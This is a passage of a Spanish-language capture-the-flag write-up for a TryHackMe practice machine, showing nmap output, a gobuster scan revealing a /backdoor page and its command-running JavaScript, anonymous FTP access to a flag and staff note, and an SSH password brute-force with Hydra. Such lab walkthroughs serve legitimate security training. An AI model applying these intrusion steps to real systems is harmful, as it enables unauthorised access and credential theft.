&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSLSessionReq,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Req
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0close\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TerminalServerCookie,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TLSSess
SF:ionReq,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:quest&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Kerberos,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;LPDString,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:e\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;LDAPSearchReq,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SIPOptions,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jul 10 17:01:09 2020 -- 1 IP address (1 host up) scanned in 671.62 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_153153.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar las hojas de estilo de la pagina, encontramos una flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_153426.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/kothhacker# gobuster dir -u http://kothhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/backdoor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/contact &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/news &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/staff &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que en backdoor existe un formulario de autenticacion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_161413.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos el codigo fuente de esta pagina y encontramos un archivo javascript que realiza la autenticacion y que si esta es correcta redirige hacia otra pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusOrCookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Incorrect credentials&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Incorrect Credentials&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;passwordBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;Cookies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SessionToken&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusOrCookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/backdoor/shell&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;/backdoor/shell&lt;/code&gt; es la pagina a la que nos redirige, analizamos la pagina y vemos que al visitarla nos redirige nuevamente al &lt;code&gt;/&lt;/code&gt;, por lo que solo podemos leer el codigo fuente, en este ultimo encontramos un archivo Javascript en donde nuevamente verifica la auntenticacion con una cookie. Pero lo interesante es de que contiene un formulario en donde se pueden &amp;ldquo;ejecutar comandos&amp;rdquo; y lo hace mediante una api.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;nx&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;runCommand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;commandText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;commandText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;Cookies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SessionToken&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;outputBox&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;outputBox&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;commandText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;clear&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;outputBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;textContent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;outputBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;textContent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;plague@gibson:$ &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;commandText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;outputBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;textContent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;postData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/api/cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;commandText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;scrollBy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Utilizamos las &amp;ldquo;credenciales&amp;rdquo; de anonymous (anonymous:anonymous) para ingresar por el servicio FTP, en donde logramos encontrar dos archivos, el primero contiene una flag y el segundo una nota.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/kothhacker# ftp kothhacker.thm 
Connected to kothhacker.thm.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act &lt;span class=&#34;m&#34;&gt;1986&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; 
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kothhacker.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 04:42 .
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 04:42 ..
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;38&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 04:42 .flag
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 03:57 note
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get .flag
local: .flag remote: .flag
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; .flag &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;38&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;38&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;189.3336 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; get note
local: note remote: note
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; note &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3.4060 MB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@upset:~/thm/kothhacker# cat note 
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
root@upset:~/thm/kothhacker#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_152842.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rcampbell---sshhydra&#34;&gt;RCAMPBELL - SSH/HYDRA&lt;/h2&gt;
&lt;p&gt;En la nota encontramos dos nombres de usuario en donde  mencionan que tienen contraseñas debiles. Creamos un archivo de texto (&lt;code&gt;users.txt&lt;/code&gt;) para utilizarlo junto con Hydra en el servicio ssh con el wordlist rockyou, y logramos obtener la contraseña para el usuario rcampbell y además el usuario gcrawford al parecer no tiene activado el acceso por este servicio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_162238.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con el usuario rcampbell y una flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_162515.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
